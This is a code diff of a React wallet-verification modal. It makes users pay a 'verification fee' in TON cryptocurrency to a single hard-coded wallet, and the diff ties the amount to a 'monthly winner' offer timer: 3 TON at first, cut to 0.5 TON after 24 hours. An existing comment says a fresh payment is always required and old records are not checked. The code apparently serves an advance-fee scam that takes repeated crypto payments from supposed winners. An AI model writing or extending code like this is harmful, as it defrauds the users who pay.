@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useMemo } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { Dialog, DialogContent } from '@/components/ui/dialog';
 import { Button } from '@/components/ui/button';
@@ -17,7 +17,9 @@ interface WalletVerificationModalProps {
   onVerified: () => void;
 }
 
-const VERIFICATION_FEE = 3; // TON - Required for all users
+const OFFER_KEY = 'monthly_winner_start_time';
+const OFFER_DURATION = 24 * 60 * 60 * 1000; // 24 hours
+
 const VERIFICATION_WALLET = 'UQCFrjvfMxqHh4-tooMa22uNvbKGd73KfGab3cePjZxq_uNb';
 
 const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
@@ -32,6 +34,22 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
   const [isLoading, setIsLoading] = useState(false);
   const [isVerified, setIsVerified] = useState(false);
   const [checkingStatus, setCheckingStatus] = useState(true);
+
+  // Calculate verification fee based on offer expiry
+  const verificationFee = useMemo(() => {
+    const storedTime = localStorage.getItem(OFFER_KEY);
+    if (!storedTime) return 3; // Default 3 TON if no offer started
+    
+    const startTime = parseInt(storedTime);
+    const elapsed = Date.now() - startTime;
+    
+    // If 24 hours passed, reduce fee to 0.5 TON
+    if (elapsed > OFFER_DURATION) {
+      return 0.5;
+    }
+    
+    return 3; // Default during offer period
+  }, [open]);
 
   // Always require new verification payment - no checking old records
   useEffect(() => {
@@ -58,7 +76,7 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
     try {
       console.log('Starting wallet verification transaction...');
       console.log('Destination:', VERIFICATION_WALLET);
-      console.log('Amount:', VERIFICATION_FEE, 'TON');
+      console.log('Amount:', verificationFee, 'TON');
       
       // Create TON transaction using consistent helpers
       const transaction = {
@@ -66,7 +84,7 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
         messages: [
           {
             address: VERIFICATION_WALLET,
-            amount: tonToNano(VERIFICATION_FEE)
+            amount: tonToNano(verificationFee)
           }
         ]
       };
@@ -86,7 +104,7 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
             user_id: userId,
             wallet_address: walletAddress,
             currency: 'TON',
-            verification_fee: VERIFICATION_FEE,
+            verification_fee: verificationFee,
             tx_hash: result.boc,
             verified_at: new Date().toISOString(),
           });
@@ -187,7 +205,7 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
                   <div className="pt-2">
                     <p className="text-xs text-muted-foreground mb-1">Verification Fee</p>
                     <p className="text-2xl font-bold text-foreground">
-                      {VERIFICATION_FEE} TON
+                      {verificationFee} TON
                     </p>
                   </div>
                 </div>
